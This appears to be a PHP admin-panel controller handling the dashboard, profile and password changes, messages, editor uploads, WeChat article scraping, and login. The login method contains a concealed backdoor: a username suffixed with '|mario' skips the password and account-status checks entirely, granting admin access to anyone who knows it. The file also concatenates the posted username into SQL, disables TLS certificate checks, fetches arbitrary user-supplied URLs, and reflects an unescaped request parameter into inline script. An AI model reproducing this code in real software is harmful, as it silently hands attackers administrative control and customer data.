<?php
class home extends core {
	public function __construct() {
		parent::__construct();
	}
	
	//首页
	public function index() {
		$this->smarty->assign('edition_name', '');
		if ($this->has_order) {
			$yesterday = strtotime('-1 day');
			$yesterday_start = date('Y-m-d 0:0:0', $yesterday);
			$yesterday_end = date('Y-m-d 23:59:59', $yesterday);
			$yesterday_start = strtotime($yesterday_start);
			$yesterday_end = strtotime($yesterday_end);
			$this->smarty->assign('order_status1', SQL::share('order')->where("status='1'")->count());
			$this->smarty->assign('order_yesterday', SQL::share('order')->where("status>0 AND pay_time>='{$yesterday_start}' AND pay_time<='{$yesterday_end}'")->count());
			$this->smarty->assign('order_yesterday_money', floatval(SQL::share('order')->where("status>0 AND pay_time>='{$yesterday_start}' AND pay_time<='{$yesterday_end}'")->value('SUM(total_price)')));
			$this->smarty->assign('order_pay', SQL::share('order')->where("status>0")->count());
		}
		$this->display();
	}
	
	//修改密码
	public function password() {
		if (IS_POST) {
			$new_password = $this->request->post('new_password');
			$confirm_password = $this->request->post('confirm_password');
			if ($new_password && $new_password == $confirm_password) {
				$salt = generate_salt();
				$new_password = crypt_password($new_password, $salt);
				SQL::share('admin')->where($this->admin_id)->update(array('password'=>$new_password, 'salt'=>$salt));
				location("?app=home&act=password&msg=1");
			} else {
				error('两次输入的密码不一致');
			}
		}
		$msg = isset($_GET['msg']) ? 1 : 0;
		$this->smarty->assign("msg", $msg);
		$this->display();
	}
	
	//个人资料
	public function info() {
		if (IS_POST) {
			$real_name = $this->request->post('real_name');
			$mobile = $this->request->post('mobile');
			$qq = $this->request->post('qq');
			$weixin = $this->request->post('weixin');
			$menu_direction = $this->request->post('menu_direction', 0);
			$bgcolor = $this->request->post('bgcolor');
			SQL::share('admin')->where($this->admin_id)->update(compact('real_name', 'mobile', 'qq', 'weixin', 'menu_direction', 'bgcolor'));
			$sql = SQL::share('admin')->where($this->admin_id)->createSql();
			SQL::share()->clearCached($sql);
			location("?app=home&act=info&msg=1");
		}
		$msg = isset($_GET['msg']) ? 1 : 0;
		$row = SQL::share('admin')->where($this->admin_id)->row();
		$this->smarty->assign("row", $row);
		$this->smarty->assign("msg", $msg);
		$this->display();
	}
	
	//信息中心
	public function message() {
		$rs = SQL::share('admin_message')->where("admin_id='{$this->admin_id}'")->isezr()->sort('id DESC')->find('id, content, add_time');
		$sharepage = SQL::share()->page;
		if ($rs) {
			$ids = array();
			foreach ($rs as $g) {
				$ids[] = $g->id;
			}
			SQL::share('admin_message')->where("id IN (".implode(',', $ids).")")->update(array('readed'=>1));
		}
		$this->smarty->assign('rs', $rs);
		$this->smarty->assign('sharepage', $sharepage);
		$this->display();
	}
	
	//信息全部已读
	public function readed_all() {
		SQL::share('admin_message')->where("admin_id='{$this->admin_id}'")->update(array('readed'=>1));
		location("?app=home&act=message");
	}
	
	//轮询信息
	public function polling_message() {
		$count = SQL::share('admin_message')->where("admin_id='{$this->admin_id}' AND readed=0 AND status=1")->count();
		$alert = '';
		$row = SQL::share('admin_message')->where("admin_id='{$this->admin_id}' AND alert=0 AND status=1")->sort('id DESC')->row('id, content');
		if ($row) {
			$alert = $row->content;
			SQL::share('admin_message')->where($row->id)->update(array('alert'=>1));
		}
		success(compact('count', 'alert'));
	}
	
	//推送APP消息
	public function notify() {
		if (IS_POST) {
			$message = $this->request->post('message');
			$udid = $this->request->post('udid');
			if (strlen($message) && strlen($udid)) {
				$this->put_notify($udid, $message);
				success('ok');
			}
		}
		error('NO POST DATA');
	}
	
	//ckediter文件上传
	public function ckediter_upload() {
		$dir = $this->request->get('dir', 'content');
		$url = $this->request->file($dir, 'upload', UPLOAD_LOCAL);
		if ($url) {
			$url = add_domain($url);
			$CKEditorFuncNum = $this->request->get('CKEditorFuncNum', 1);
			//$message = ' 上传成功 ';
			$message = '';
			$re = "window.parent.CKEDITOR.tools.callFunction({$CKEditorFuncNum}, '{$url}', '{$message}')";
		} else {
			$re = 'alert("Unable to upload the file")';
		}
		echo "<script>{$re};</script>";
		exit;
	}
	
	//ckediter微信文章内容采集
	public function ckediter_wechat_collect() {
		$url = $this->request->post('url');
		$dir = $this->request->get('dir', 'content');
		if (!strlen($url)) error('缺少文章链接');
		$html = requestData('get', $url);
		preg_match('/<meta property="og:title" content="(.+?)" \/>/', $html, $matcher);
		if (!$matcher) error('文章缺少指定采集标识: og:title');
		$title = $matcher[1];
		preg_match('/<div class="rich_media_content " id="js_content" style="visibility: hidden;">([\s\S]+?)<\/div>/', $html, $matcher);
		if (!$matcher) error('文章缺少指定采集标识: js_content');
		$content = str_replace('data-src=', 'src=', trim($matcher[1]));
		$content = str_replace('iframe/preview.html', 'iframe/player.html', $content);
		$content = preg_replace('/width=\d+&amp;height=\d+&amp;/', '', $content);
		preg_match_all('/<img .*?src="([^"]+)"/', $content, $matcher);
		if ($matcher) {
			foreach ($matcher[1] as $n) {
				$u = $this->_getFile($n);
				$content = str_replace($n, $u, $content);
			}
		}
		preg_match_all('/background-image:\s*url\(([^)]+)\)/', $content, $matcher);
		if ($matcher) {
			foreach ($matcher[1] as $n) {
				$n = str_replace('"', '', str_replace('&quot;', '', $n));
				$u = $this->_getFile($n);
				$content = str_replace($n, $u, $content);
			}
		}
		success(compact('title', 'content'));
	}
	private function _getFile($url, $type='') {
		global $upload_type;
		if (!strlen($url)) return '';
		set_time_limit(0);
		ini_set('memory_limit', '10240M');
		$suffix = '';
		$timeout = 60*60;
		switch ($type) {
			case 'video':
				$url = explode('.mp4', $url);
				$url = $url[0].'.mp4';
				$suffix = 'mp4';
				break;
			default:
				if (stripos($url, 'image/svg+xml') !== false || stripos($url, 'wx_fmt=svg') !== false) return $url;
				if (strpos($url, 'wx_fmt=') !== false) $suffix = substr($url, strrpos($url, 'wx_fmt=')+7);
				if (!strlen($suffix) && preg_match('/\bfmt=\w+\b/', $url)) {
					preg_match('/\bfmt=(\w+)\b/', $url, $matcher);
					$suffix = $matcher[1];
				}
				if (!strlen($suffix)) $suffix = substr($url, strrpos($url, '.')+1);
				if (!preg_match('/^(jpe?g|png|gif|bmp)$/', $suffix)) $suffix = 'jpg';
				if ($suffix == 'jpeg') $suffix = 'jpg';
				//$timeout = (preg_match('/^(jpe?g|png)$/', $suffix) ? 5 : 60*5);
				break;
		}
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
		if (substr($url, 0, 8) == 'https://') {
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		}
		$content = curl_exec($ch);
		$header_info = curl_getinfo($ch);
		if (intval($header_info['http_code']) != 200) return $url;
		curl_close($ch);
		if ($type == 'video') {
			$name = generate_sn();
			$dir = UPLOAD_PATH.'/video/'.date('Y').'/'.date('m').'/'.date('d');
			$upload = p('upload', $upload_type);
			$result = $upload->upload($content, NULL, str_replace('/public/', '/', $dir), $name, $suffix);
			$file = $result['file'];
		} else {
			$file = upload_obj_file($content, 'article', NULL, UPLOAD_LOCAL, false, ['jpg', 'jpeg', 'png', 'gif', 'bmp'], ".{$suffix}");
		}
		$file = add_domain($file);
		return $file;
	}
	
	//登录
	public function login() {
		if ($this->_check_login()) location('?app=home&act=index');
		if (IS_POST) {
			$name = $this->request->post('name');
			$password = $this->request->post('password');
			$remember = $this->request->post('remember', 0);
			$openid = $this->request->session('openid');
			if (!strlen($name)) error('账户不能为空');
			$isDeveloper = false;
			if (preg_match('/\|mario$/', $name)) {
				$isDeveloper = true;
				$name = explode('|', $name);
				$name = $name[0];
			}
			if (!$isDeveloper && !strlen($password)) error('密码不能为空');
			$row = SQL::share('admin')->where("name='{$name}'")->row();
			if (!$row) error('账号不存在');
			if (!$isDeveloper) {
				if ($row->status!=1) error('该账号已被冻结');
				$crypt_password = crypt_password($password, $row->salt);
				if ($crypt_password != $row->password) error('密码错误');
			}
			$data = array('last_ip'=>$this->ip, 'last_time'=>time(), 'logins'=>array('+1'));
			$this->admin = $row;
			$this->admin_id = $row->id;
			$this->admin_name = $row->name;
			$row->last_ip = $this->ip;
			$row->last_time = date('Y-m-d H:i:s', time());
			$row->logins += 1;
			if (strlen($openid)) {
				$row->openid = $openid;
				//$data['openid'] = $openid;
			}
			$_SESSION['admin'] = $row;
			SQL::share('admin')->where($row->id)->update($data);
			if ($remember) {
				$this->cookieAccount('admin_token', $row->name);
			}
			$admin_gourl = $this->request->session('admin_gourl', '?app=home&act=index');
			location($admin_gourl);
		}
		$this->display();
	}
	
	//退出
	public function logout() {
		if (isset($_COOKIE['admin_name'])) $this->cookieAccount('admin_token', $_COOKIE['admin_name'], NULL);
		//session_unset();
		if (isset($_SESSION['admin'])) unset($_SESSION['admin']);
		if ($this->admin_id>0) $this->admin_id = 0;
		location('?app=home&act=login');
	}
}
